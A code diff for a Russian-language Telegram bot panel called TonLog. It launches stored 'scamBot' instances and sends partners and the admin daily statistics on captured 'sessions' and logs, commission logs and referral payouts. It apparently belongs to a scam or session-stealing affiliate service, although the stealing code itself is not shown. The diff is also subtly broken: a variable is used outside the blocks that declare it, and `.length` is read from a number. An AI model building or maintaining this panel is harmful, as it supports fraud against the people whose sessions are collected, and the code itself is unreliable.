@@ -1,6 +1,6 @@
 import { Router, bot } from "./bot/index.js";
 import Database from "./database/index.js";
-import config from '../config.json' assert { type: 'json' };
+import config from "../config.json" assert { type: "json" };
 import user from "./database/schemas/user.js";
 import template from "./database/schemas/template.js";
 import Bot from "./database/schemas/bot.js";
@@ -15,107 +15,144 @@ console.clear();
 await Database.connect(config.db);
 await new Router().route(bot);
 notifyBot();
-for(let bot of await Bot.find({ blocked: false })) {
-    try {
-        scamBot(bot.token, await template.findOne({ id: bot.template }) || {});
-    } catch(e) {
-        console.log(e)
-    }
+for (let bot of await Bot.find({ blocked: false })) {
+  try {
+    scamBot(bot.token, (await template.findOne({ id: bot.template })) || {});
+  } catch (e) {
+    console.log(e);
+  }
 }
 
 const day = new Date();
-day.setDate(new Date().getDate() +1);
-day.setHours(0, 0, 0, 0)
+day.setDate(new Date().getDate() + 1);
+day.setHours(0, 0, 0, 0);
 
 const interval = day.getTime() - Date.now();
 
-
 async function send() {
-    setTimeout(send, 86400000);
-    const users = await user.find();
-    
-    for(let user of users) {
-        let templates = await template.find({ owner: user.id });
-        let templatesY = await template.find({ owner: user.id });
+  setTimeout(send, 86400000);
+  const users = await user.find();
+  for (let user of users) {
+    if(user.report_day === false) continue;
+    let templates = await template.find({ owner: user.id });
+    let templatesY = await template.find({ owner: user.id });
 
-        if(!templates.length) continue;
+    if (!templates.length) continue;
 
-        templates = await Promise.all(
-            templates.map(async t => {
-                const bots = await Bot.find({ template: t.id });
+    templates = await Promise.all(
+      templates.map(async (t) => {
+        const bots = await Bot.find({ template: t.id });
 
-                const starts = (await Promise.all(
-                    bots.map(async bot => {
-                        return (await botUser.find({ botId: bot.id }))
-                            .filter(x => {
-                                return new Date(x.created).getDate() == (new Date().getDate() - 1);
-                            }).length;
-                    })
-                ))
-                    .reduce((a, b) => a + b, 0);
-
-                const logs = (await Promise.all(
-                    bots.map(async bot => {
-                        return (await log.find({ bot: bot.token }))
-                            .filter(x => {
-                                return new Date(x.created).getDate() == (new Date().getDate() - 1);
-                            }).length;
-                    })
-                ))
-                    .reduce((a, b) => a + b, 0);
-
-                return {
-                    template: t.name,
-                    starts: starts,
-                    logs
-                }
+        const starts = (
+          await Promise.all(
+            bots.map(async (bot) => {
+              return (await botUser.find({ botId: bot.id })).filter((x) => {
+                return (
+                  new Date(x.created).getDate() == new Date().getDate() - 1
+                );
+              }).length;
             })
-        )
+          )
+        ).reduce((a, b) => a + b, 0);
 
-        templatesY = await Promise.all(
-            templatesY.map(async t => {
-                const bots = await Bot.find({ template: t.id });
-
-                const logs = (await Promise.all(
-                    bots.map(async bot => {
-                        return (await log.find({ bot: bot.token }))
-                            .filter(x => {
-                                return new Date(x.created).getDate() == (new Date().getDate() - 2);
-                            }).length;
-                    })
-                ))
-                    .reduce((a, b) => a + b, 0);
-
-                return {
-                    template: t.name,
-                    logs
-                }
+        const logs = (
+          await Promise.all(
+            bots.map(async (bot) => {
+              return (await log.find({ bot: bot.token })).filter((x) => {
+                return (
+                  new Date(x.created).getDate() == new Date().getDate() - 1
+                );
+              }).length;
             })
-        )
+          )
+        ).reduce((a, b) => a + b, 0);
 
-        const allLogs = templates.map(x => x.logs).reduce((a, b) => a + b, 0);
-        const allLogsY = templatesY.map(x => x.logs).reduce((a, b) => a + b, 0)
-        const msg = `<b>🌙  Наступил конец рабочего дня.</b>
+        return {
+          template: t.name,
+          starts: starts,
+          logs,
+        };
+      })
+    );
 
-ℹ️ <b>За сегодня Вы получили: ${allLogs} сессий. Это на </b><b>${Math.abs(allLogs - allLogsY)}</b> <b>${allLogs > allLogsY ? 'больше' : 'меньше'} чем за вчера.</b>
+    templatesY = await Promise.all(
+      templatesY.map(async (t) => {
+        const bots = await Bot.find({ template: t.id });
+
+        const logs = (
+          await Promise.all(
+            bots.map(async (bot) => {
+              return (await log.find({ bot: bot.token })).filter((x) => {
+                return (
+                  new Date(x.created).getDate() == new Date().getDate() - 2
+                );
+              }).length;
+            })
+          )
+        ).reduce((a, b) => a + b, 0);
+
+        return {
+          template: t.name,
+          logs,
+        };
+      })
+    );
+
+    const allLogs = templates.map((x) => x.logs).reduce((a, b) => a + b, 0);
+    const allLogsY = templatesY.map((x) => x.logs).reduce((a, b) => a + b, 0);
+ 
+    if (user.id === config.admin) {
+      const logs = await log.find({ created: { $gte: day } });
+      let logsY = await log.find({ created: { $gte: day } });
+      logsY = logsY.filter((x) => {
+        return new Date(x.created).getDate() == new Date().getDate() - 1;
+      }).length;
+      const msg = `<b>🌙  Наступил конец рабочего дня.</b>
+
+ℹ️ <b>За сегодня панель обработала: ${
+        logs.length
+      } сессий. Это на </b><b>${Math.abs(logs.length - logsY)}</b> <b>${
+        logs.length > logsY ? "больше" : "меньше"
+      } чем за вчера.</b>
+
+⚡️ <b>Статистика по панели за сегодня:</b>
+
+🙎🏼‍♂️ <b>Партнеров:</b> <code>${users.length}</code>
+👨🏼‍💻 <b>Активных партнеров:</b> <code>${
+        users.filter((x) => x.blocked === false).length
+      }</code>
+📊 <b>Получено логов:</b> <code>${logsY.length}</code>
+💰 <b>Комиссионных логов:</b> <code>${
+        logsY.filter((x) => x.bot.includes("com")).length
+      }</code>
+👥 <b>Выплата рефералам:</b> <code>${
+        logsY.filter((x) => x.bot.includes("ref")).length
+      }</code>`;
+    } else {
+      const msg = `<b>🌙  Наступил конец рабочего дня.</b>
+
+ℹ️ <b>За сегодня Вы получили: ${allLogs} сессий. Это на </b><b>${Math.abs(
+        allLogs - allLogsY
+      )}</b> <b>${allLogs > allLogsY ? "больше" : "меньше"} чем за вчера.</b>
 
 ⚡️ <b>Статистика по шаблонам:</b>
 
-${
-    templates.map(t => {
-        return `🤖 <b>${t.template}</b>:
+${templates
+  .map((t) => {
+    return `🤖 <b>${t.template}</b>:
 🚀 <b>Запуски:</b> <code>${t.starts}</code>
-📊 <b>Получено логов:</b> <code>${t.logs}</code>`
-    }).join('\n\n')
-}
+📊 <b>Получено логов:</b> <code>${t.logs}</code>`;
+  })
+  .join("\n\n")}
 
-💎 Спасибо за выбор <code>TonLog</code>!`
-
-        await bot.sendMessage(user.id, msg, {
-            parse_mode: 'HTML'
-        })
-            .catch(e => console.log(e.toString()));
+💎 Спасибо за выбор <code>TonLog</code>!`;
     }
+    await bot
+      .sendMessage(user.id, msg, {
+        parse_mode: "HTML",
+      })
+      .catch((e) => console.log(e.toString()));
+  }
 }
 
 setTimeout(send, interval);
